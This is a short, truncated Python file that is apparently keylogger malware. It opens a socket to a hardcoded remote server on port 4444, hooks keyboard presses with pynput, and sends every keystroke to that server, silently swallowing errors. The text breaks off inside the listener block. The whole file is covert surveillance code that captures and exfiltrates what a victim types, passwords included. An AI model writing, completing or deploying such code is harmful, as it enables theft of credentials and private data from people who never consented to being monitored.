import socket
import threading
import time
from pynput import keyboard

SERVER_IP = '192.168.54.183'
SERVER_PORT = 4444
BUFFER_SIZE = 1024

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

def send_keys():
    def on_press(key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = str(key)
        try:
            client_socket.send(key_data.encode('utf-8'))
        except:
            pass  # Connection might be closed
    with keyboard.Listener(on_press=on_press) as listener: